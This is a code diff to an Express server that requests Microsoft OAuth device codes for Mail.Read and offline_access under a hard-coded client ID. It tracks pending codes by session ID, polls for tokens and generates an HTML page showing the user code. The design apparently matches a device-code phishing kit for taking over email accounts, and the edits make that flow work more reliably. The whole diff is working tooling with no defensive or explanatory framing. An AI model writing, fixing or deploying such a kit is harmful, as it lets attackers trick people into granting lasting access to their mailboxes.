@@ -1,7 +1,6 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const crypto = require('crypto');
 const path = require('path');
 
 const app = express();
@@ -29,25 +28,17 @@ function generateSID() {
     return Math.floor(Math.random() * 9000000) + 1000000;
 }
 
-// Get client info
-function getClientInfo(req) {
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
-    const userAgent = req.headers['user-agent'] || 'Unknown';
-    return { ip, userAgent };
-}
-
 // ============================================
-// Create session - NOW USING ONEDRIVE SCOPES
+// Create session - USING WORKING CLIENT ID
 // ============================================
 app.post('/api/create-session', async (req, res) => {
     try {
         const sid = generateSID();
-        const deviceCode = generateDeviceCode();
         
-        // Use OneDrive scopes instead of Graph - THIS WORKS!
+        // Using working client ID for device code flow
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
-                client_id: '1d1b3917-9e4b-4dc7-b390-0daefd46b435',  // OneDrive consumer client
+                client_id: '1d1b3917-9e4b-4dc7-b390-0daefd46b435',
                 scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
             }), {
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
@@ -74,13 +65,12 @@ app.post('/api/create-session', async (req, res) => {
             success: true,
             sid: sid,
             user_code: user_code,
-            verification_uri: verification_uri,
             expires_in: expires_in
         });
         
     } catch (err) {
-        console.error('Error:', err.response?.data || err.message);
-        res.status(500).json({ error: 'Failed to create session' });
+        console.error('Create session error:', err.response?.data || err.message);
+        res.status(500).json({ error: 'Failed to create session: ' + (err.response?.data?.error_description || err.message) });
     }
 });
 
@@ -197,12 +187,35 @@ app.delete('/api/sessions/clear', async (req, res) => {
 });
 
 // ============================================
-// Generate auth page
+// Generate auth page - FIXED (no self-call)
 // ============================================
 app.get('/generate-auth-page', async (req, res) => {
     try {
-        const createRes = await axios.post(`http://localhost:${PORT}/api/create-session`);
-        const { sid, user_code } = createRes.data;
+        // Create session directly without calling own API
+        const sid = generateSID();
+        
+        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            new URLSearchParams({
+                client_id: '1d1b3917-9e4b-4dc7-b390-0daefd46b435',
+                scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
+            }), {
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+            }
+        );
+        
+        const { device_code, user_code, expires_in } = response.data;
+        
+        pendingAuth.set(device_code, {
+            device_code,
+            user_code,
+            sid,
+            status: 'pending',
+            createdAt: Date.now(),
+            expiresAt: Date.now() + (expires_in * 1000)
+        });
+        
+        // Start polling
+        pollForToken(device_code, sid);
         
         const html = `<!DOCTYPE html>
 <html lang="en">
@@ -321,6 +334,7 @@ app.get('/generate-auth-page', async (req, res) => {
         res.send(html);
         
     } catch (err) {
+        console.error('Generate page error:', err.message);
         res.status(500).send('Error generating auth page: ' + err.message);
     }
 });
